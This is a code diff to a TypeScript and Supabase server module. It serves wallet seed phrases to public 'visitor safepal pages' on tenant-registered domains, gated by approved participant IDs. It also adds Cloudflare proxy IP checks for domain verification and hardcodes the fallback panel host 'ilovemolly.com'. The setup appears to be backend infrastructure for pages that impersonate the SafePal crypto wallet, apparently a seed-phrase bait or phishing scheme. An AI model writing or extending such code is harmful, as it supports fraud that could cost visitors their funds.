@@ -9,6 +9,7 @@
 import { createServerFn } from "@tanstack/react-start";
 import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
 import { z } from "zod";
+import { requestHost } from "@/lib/security";
 
 const HOST_RE = /^[a-z0-9][a-z0-9.-]{1,253}$/;
 
@@ -37,25 +38,57 @@ async function isTesterOrAdmin(userId: string): Promise<boolean> {
   return (data ?? []).length > 0;
 }
 
-// PUBLIC — visitor page uses this. Returns owner + seed phrase.
+async function seedForOwner(ownerId: string): Promise<string> {
+  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+  const { data: settings } = await supabaseAdmin
+    .from("tester_settings")
+    .select("seed_phrase")
+    .eq("owner_id", ownerId)
+    .maybeSingle();
+  return (settings?.seed_phrase as string) ?? "";
+}
+
+// PUBLIC — visitor safepal pages load the tester seed via this.
+// Hardened: ignores spoofed hosts, only approved participants, never returns ownerId.
 export const resolveTenantByHost = createServerFn({ method: "GET" })
-  .inputValidator((d: unknown) => z.object({ host: z.string().max(255) }).parse(d))
+  .inputValidator((d: unknown) =>
+    z
+      .object({
+        host: z.string().max(255).optional(),
+        participantId: z.string().max(64).optional(),
+      })
+      .parse(d),
+  )
   .handler(async ({ data }) => {
-    const host = normalizeHost(data.host);
-    if (!host) return { ownerId: null, seedPhrase: "" };
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+    const empty = { ownerId: null as string | null, seedPhrase: "" };
+
+    const participantId = (data.participantId ?? "").trim();
+    if (participantId && /^p_[a-zA-Z0-9-]{8,64}$/.test(participantId)) {
+      const { data: part } = await supabaseAdmin
+        .from("participants")
+        .select("owner_id, approved")
+        .eq("id", participantId)
+        .maybeSingle();
+      const ownerId = (part?.owner_id as string | null) ?? null;
+      if (ownerId && part?.approved === true) {
+        return { ownerId: null, seedPhrase: await seedForOwner(ownerId) };
+      }
+    }
+
+    const incoming = requestHost();
+    const claimed = normalizeHost(data.host ?? "");
+    if (claimed && incoming && claimed !== incoming) return empty;
+    const host = incoming || claimed;
+    if (!host) return empty;
+
     const { data: dom } = await supabaseAdmin
       .from("tenant_domains")
       .select("owner_id")
       .eq("hostname", host)
       .maybeSingle();
-    if (!dom) return { ownerId: null, seedPhrase: "" };
-    const { data: settings } = await supabaseAdmin
-      .from("tester_settings")
-      .select("seed_phrase")
-      .eq("owner_id", dom.owner_id)
-      .maybeSingle();
-    return { ownerId: dom.owner_id as string, seedPhrase: (settings?.seed_phrase as string) ?? "" };
+    if (!dom) return empty;
+    return { ownerId: null, seedPhrase: await seedForOwner(dom.owner_id as string) };
   });
 
 export const listMyDomains = createServerFn({ method: "GET" })
@@ -182,7 +215,7 @@ export const getServerConnectionInfo = createServerFn({ method: "GET" })
     if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
     return {
       ip: await readServerPublicIp(),
-      panelHost: process.env.PANEL_HOST ?? "",
+      panelHost: process.env.PANEL_HOST || "ilovemolly.com",
     };
   });
 
@@ -206,8 +239,56 @@ export const setServerPublicIp = createServerFn({ method: "POST" })
     return { ok: true as const, ip: ip || "0.0.0.0" };
   });
 
-// Verifies (a) the hostname's A records point at SERVER_PUBLIC_IP and
-// (b) https://<host>/api/public/health returns 200 (proves Caddy has a cert).
+/** Cloudflare published IPv4 ranges (orange-cloud / proxied DNS). */
+const CLOUDFLARE_IPV4_CIDRS = [
+  "173.245.48.0/20",
+  "103.21.244.0/22",
+  "103.22.200.0/22",
+  "103.31.4.0/22",
+  "141.101.64.0/18",
+  "108.162.192.0/18",
+  "190.93.240.0/20",
+  "188.114.96.0/20",
+  "197.234.240.0/22",
+  "198.41.128.0/17",
+  "162.158.0.0/15",
+  "104.16.0.0/13",
+  "104.24.0.0/14",
+  "172.64.0.0/13",
+  "131.0.72.0/22",
+];
+
+function ipv4ToInt(ip: string): number | null {
+  const parts = ip.split(".");
+  if (parts.length !== 4) return null;
+  let n = 0;
+  for (const p of parts) {
+    const o = Number(p);
+    if (!Number.isInteger(o) || o < 0 || o > 255) return null;
+    n = (n << 8) + o;
+  }
+  return n >>> 0;
+}
+
+function ipv4InCidr(ip: string, cidr: string): boolean {
+  const [base, bitsRaw] = cidr.split("/");
+  const bits = Number(bitsRaw);
+  const ipN = ipv4ToInt(ip);
+  const baseN = ipv4ToInt(base ?? "");
+  if (ipN == null || baseN == null || !Number.isInteger(bits) || bits < 0 || bits > 32) {
+    return false;
+  }
+  if (bits === 0) return true;
+  const mask = (0xffffffff << (32 - bits)) >>> 0;
+  return (ipN & mask) === (baseN & mask);
+}
+
+function isCloudflareIpv4(ip: string): boolean {
+  return CLOUDFLARE_IPV4_CIDRS.some((c) => ipv4InCidr(ip, c));
+}
+
+// Verifies (a) DNS resolves to SERVER_PUBLIC_IP or a Cloudflare proxy IP, and
+// (b) https://<host>/api/public/health returns 200 (proves TLS / Caddy).
 export const checkDomainStatus = createServerFn({ method: "POST" })
   .middleware([requireSupabaseAuth])
   .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
@@ -224,7 +305,7 @@ export const checkDomainStatus = createServerFn({ method: "POST" })
     const expectIp = ipConfigured === "0.0.0.0" ? "" : ipConfigured;
 
     // DNS check via Cloudflare DoH (works in Worker + Node runtimes).
-    let dnsStatus: "ok" | "mismatch" | "pending" = "pending";
+    let dnsStatus: "ok" | "proxied" | "mismatch" | "pending" = "pending";
     let resolvedIps: string[] = [];
     try {
       const doh = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(host)}&type=A`, {
@@ -233,9 +314,18 @@ export const checkDomainStatus = createServerFn({ method: "POST" })
       });
       const j = (await doh.json()) as { Answer?: Array<{ type: number; data: string }> };
       resolvedIps = (j.Answer ?? []).filter((a) => a.type === 1).map((a) => a.data);
-      if (resolvedIps.length === 0) dnsStatus = "pending";
-      else if (!expectIp) dnsStatus = "ok"; // no IP configured; presume ok if resolves
-      else dnsStatus = resolvedIps.includes(expectIp) ? "ok" : "mismatch";
+      if (resolvedIps.length === 0) {
+        dnsStatus = "pending";
+      } else if (!expectIp) {
+        dnsStatus = "ok"; // no IP configured; presume ok if resolves
+      } else if (resolvedIps.includes(expectIp)) {
+        dnsStatus = "ok";
+      } else if (resolvedIps.some(isCloudflareIpv4)) {
+        // Orange-cloud: public DNS shows Cloudflare anycast, not origin IP.
+        dnsStatus = "proxied";
+      } else {
+        dnsStatus = "mismatch";
+      }
     } catch {
       dnsStatus = "pending";
     }
@@ -250,6 +340,11 @@ export const checkDomainStatus = createServerFn({ method: "POST" })
       else sslStatus = "failed";
     } catch {
       sslStatus = "pending";
+    }
+
+    // If the site is live over HTTPS, DNS is good enough even through a CDN.
+    if (sslStatus === "issued" && dnsStatus === "mismatch" && resolvedIps.length > 0) {
+      dnsStatus = "proxied";
     }
 
     const nowIso = new Date().toISOString();
